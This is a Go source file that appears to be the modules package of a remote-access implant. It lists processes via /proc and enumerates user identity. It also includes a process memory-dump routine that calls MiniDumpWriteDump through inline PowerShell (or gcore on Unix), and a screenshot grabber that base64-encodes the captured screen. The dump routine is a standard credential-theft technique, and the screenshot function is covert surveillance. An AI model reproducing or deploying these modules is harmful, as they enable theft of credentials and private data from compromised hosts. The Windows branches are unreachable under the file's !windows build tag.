//go:build !windows

package modules

// Native PsModule - Linux/Unix process listing via /proc parsing.

import (
	"fmt"
	"os"
	"runtime"
	"strings"
)

// PsModule lists all running processes with details.
func PsModule(args string) (string, string, int) {
	return psLinux()
}

// ---------- Linux/Unix ps implementation ----------

func psLinux() (string, string, int) {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return "", fmt.Sprintf("readdir /proc: %v", err), 1
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("%-8s %-30s %-20s %-6s %-8s %s\n",
		"PID", "Name", "Owner", "Arch", "Session", "Integrity"))
	sb.WriteString(strings.Repeat("-", 90) + "\n")

	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		pid := parsePID(e.Name())
		if pid == 0 {
			continue
		}

		stat, err := os.ReadFile(fmt.Sprintf("/proc/%d/stat", pid))
		if err != nil {
			continue
		}

		name := parseStatName(string(stat))
		owner := getProcOwner(pid)
		arch := getProcArch(pid)
		session := getProcSession(pid)

		sb.WriteString(fmt.Sprintf("%-8d %-30s %-20s %-6s %-8s %s\n",
			pid, name, owner, arch, session, "N/A"))
	}

	return sb.String(), "", 0
}

// parsePID extracts an integer from a string, returns 0 on failure.
func parsePID(s string) int {
	var pid int
	if _, err := fmt.Sscanf(s, "%d", &pid); err != nil {
		return 0
	}
	return pid
}

// parseStatName extracts the process name from /proc/[pid]/stat.
func parseStatName(stat string) string {
	openIdx := strings.Index(stat, "(")
	closeIdx := strings.LastIndex(stat, ")")
	if openIdx == -1 || closeIdx == -1 || closeIdx <= openIdx {
		return "?"
	}
	return stat[openIdx+1 : closeIdx]
}

// getProcOwner reads /proc/[pid]/status for Uid and maps to username.
func getProcOwner(pid int) string {
	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		return "?"
	}
	lines := strings.Split(string(data), "\n")
	var uidStr string
	for _, line := range lines {
		if strings.HasPrefix(line, "Uid:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				uidStr = fields[1]
			}
			break
		}
	}
	if uidStr == "" {
		return "?"
	}
	return uidFromPasswd(uidStr)
}

func uidFromPasswd(uid string) string {
	data, err := os.ReadFile("/etc/passwd")
	if err != nil {
		return uid
	}
	for _, line := range strings.Split(string(data), "\n") {
		fields := strings.Split(line, ":")
		if len(fields) >= 3 && fields[2] == uid {
			return fields[0]
		}
	}
	return uid
}

// getProcArch reads the ELF header from /proc/[pid]/exe.
func getProcArch(pid int) string {
	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/exe", pid))
	if err != nil {
		return "?"
	}
	if len(data) < 5 {
		return "?"
	}
	if data[0] == 0x7f && data[1] == 'E' && data[2] == 'L' && data[3] == 'F' {
		if data[4] == 1 {
			return "32"
		} else if data[4] == 2 {
			return "64"
		}
	}
	return "?"
}

// getProcSession reads field 6 (session) from /proc/[pid]/stat.
func getProcSession(pid int) string {
	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/stat", pid))
	if err != nil {
		return "?"
	}
	stat := string(data)
	closeParen := strings.LastIndex(stat, ")")
	if closeParen == -1 {
		return "?"
	}
	fields := strings.Fields(stat[closeParen+1:])
	if len(fields) < 5 {
		return "?"
	}
	return fields[4]
}

// ProcDumpModuleActual creates a process memory dump.
func ProcDumpModuleActual(args string) (string, string, int) {
	if args == "" {
		return "", "usage: procdump <pid> <output_path>", 1
	}
	parts := strings.Fields(args)
	if len(parts) < 2 {
		return "", "usage: procdump <pid> <output_path>", 1
	}
	pid, outPath := parts[0], parts[1]
	if runtime.GOOS == "windows" {
		psCmd := fmt.Sprintf(
			"$p=Get-Process -Id %s; $d='%s'; "+
				"Add-Type -TypeDefinition 'using System;using System.Diagnostics;"+
				"using System.Runtime.InteropServices;public static class MD{"+
				"[DllImport(\"dbghelp.dll\")]public static extern bool MiniDumpWriteDump("+
				"IntPtr h,int pid,IntPtr f,int t,IntPtr e,IntPtr u,IntPtr c);}' ; "+
				"$s=[System.IO.File]::Create($d);"+
				"[MD]::MiniDumpWriteDump($p.Handle,$p.Id,$s.SafeFileHandle.DangerousGetHandle(),"+
				"2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero); $s.Close()",
			pid, outPath)
		return ShellModule("powershell -NoProfile -Command \"" + psCmd + "\"")
	}
	return ShellModule(fmt.Sprintf("gcore -o %s %s", outPath, pid))
}

// ScreenshotModuleActual takes a screenshot.
func ScreenshotModuleActual(args string) (string, string, int) {
	if runtime.GOOS == "windows" {
		psCmd := `Add-Type -AssemblyName System.Windows.Forms;` +
			`$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;` +
			`$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height);` +
			`$g=[System.Drawing.Graphics]::FromImage($b);` +
			`$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);` +
			`$b.Save("$env:TEMP\screenshot.png");$g.Dispose();$b.Dispose();` +
			`[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:TEMP\screenshot.png"))`
		return ShellModule("powershell -NoProfile -Command \"" + psCmd + "\"")
	}
	if _, _, code := ShellModule("which scrot 2>/dev/null"); code == 0 {
		return ShellModule("scrot /tmp/screenshot.png && base64 /tmp/screenshot.png")
	}
	return ShellModule("xwd -root -silent | base64")
}

// TokenWhoamiModule shows current token info.
func TokenWhoamiModule(args string) (string, string, int) {
	if runtime.GOOS == "windows" {
		return ShellModule("whoami /all")
	}
	return ShellModule("id && groups")
}

// WhoisModule gets full user info.
func WhoisModule(args string) (string, string, int) {
	if runtime.GOOS == "windows" {
		return ShellModule("net user %USERNAME% /domain 2>nul || net user %USERNAME%")
	}
	return ShellModule("id; groups; whoami --all")
}
